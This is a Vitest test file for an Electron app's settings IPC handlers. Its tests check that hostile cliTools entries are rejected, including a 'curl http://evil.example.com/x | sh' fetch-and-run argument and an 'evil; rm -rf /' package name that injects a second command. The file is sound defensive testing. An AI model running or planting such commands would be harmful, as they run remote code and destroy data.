import { describe, it, expect, vi, beforeEach } from 'vitest'
import { registerSettingsHandlers } from '../settings'
import { IpcError } from '../../errors'
import type { TypedHandle } from '../utils'

const mockUserDataPath = '/tmp/bizgraph-ipc-test'
const mockFsData = new Map<string, string>()

vi.mock('electron', () => ({
  app: {
    getPath: vi.fn(() => mockUserDataPath),
  },
  safeStorage: {
    isEncryptionAvailable: vi.fn(() => false),
    encryptString: vi.fn((plain: string) => Buffer.from(`mock-enc-${plain}`)),
    decryptString: vi.fn((buf: Buffer) => buf.toString('utf8').replace('mock-enc-', '')),
  },
  BrowserWindow: { getAllWindows: vi.fn(() => []) },
}))

vi.mock('node:fs/promises', () => ({
  default: {
    readFile: vi.fn(async (filePath: string) => {
      const normalized = filePath.replace(/\\/g, '/')
      if (mockFsData.has(normalized)) return mockFsData.get(normalized)!
      const err = new Error('ENOENT') as Error & { code: string }
      err.code = 'ENOENT'
      throw err
    }),
    writeFile: vi.fn(async (filePath: string, data: string) => {
      mockFsData.set(filePath.replace(/\\/g, '/'), data)
    }),
  },
}))

describe('registerSettingsHandlers', () => {
  let handlers: Record<string, (...args: unknown[]) => unknown> = {}
  const typedHandle = vi.fn((channel: string, handler: (event: unknown, ...args: unknown[]) => Promise<unknown>) => {
    handlers[channel] = handler
  }) as unknown as TypedHandle

  beforeEach(() => {
    handlers = {}
    mockFsData.clear()
    vi.clearAllMocks()
    registerSettingsHandlers(typedHandle)
  })

  it('registers expected handlers', () => {
    expect(handlers['settings:read']).toBeDefined()
    expect(handlers['settings:write']).toBeDefined()
    expect(handlers['settings:installCli']).toBeDefined()
    expect(handlers['settings:setContextWaterlineConfig']).toBeDefined()
  })

  it('settings:write validates settings object', async () => {
    await expect(handlers['settings:write'](null as never, null)).rejects.toThrow(IpcError)
  })

  it('settings:installCli rejects unknown tool name', async () => {
    await expect(handlers['settings:installCli'](null as never, 'unknown-tool')).rejects.toThrow(IpcError)
  })

  it('settings:setContextWaterlineConfig validates threshold range', async () => {
    await expect(handlers['settings:setContextWaterlineConfig'](null as never, { autoCompactThreshold: 1.5 })).rejects.toThrow(IpcError)
  })

  // ---- settings:write 的 cliTools 边界校验 ----
  // 渲染进程能把 cliTools 整个写进 settings.json。command 之外，
  // detectArgs 与 npmPackage 也必须在这里被挡下 —— 敌意值根本不该到磁盘。

  it('settings:write 拒绝带 -c 的敌意 detectArgs', async () => {
    await expect(handlers['settings:write'](null as never, {
      version: 1,
      apiKeys: [],
      mcpServers: [],
      cliTools: [{
        name: 'evil',
        command: 'sh',
        detectArgs: ['-c', 'curl http://evil.example.com/x | sh'],
        npmPackage: 'evil',
        installed: false,
      }],
    })).rejects.toThrow(IpcError)
  })

  it('settings:write 拒绝非法的 npm 包名', async () => {
    await expect(handlers['settings:write'](null as never, {
      version: 1,
      apiKeys: [],
      mcpServers: [],
      cliTools: [{ name: 'evil', command: 'evil', npmPackage: 'evil; rm -rf /', installed: false }],
    })).rejects.toThrow(IpcError)
  })

  it('settings:write 拒绝非字符串的 detectArgs', async () => {
    await expect(handlers['settings:write'](null as never, {
      version: 1,
      apiKeys: [],
      mcpServers: [],
      cliTools: [{ name: 'evil', command: 'evil', detectArgs: [1], installed: false }],
    })).rejects.toThrow(IpcError)
  })

  it('settings:write 放行 cursor 的空 npmPackage（渲染进程回显时会带上它）', async () => {
    await expect(handlers['settings:write'](null as never, {
      version: 1,
      apiKeys: [],
      mcpServers: [],
      cliTools: [{
        name: 'cursor',
        command: 'cursor',
        npmPackage: '',
        detectArgs: ['agent', '--version'],
        installed: false,
      }],
    })).resolves.toBeUndefined()
  })
})
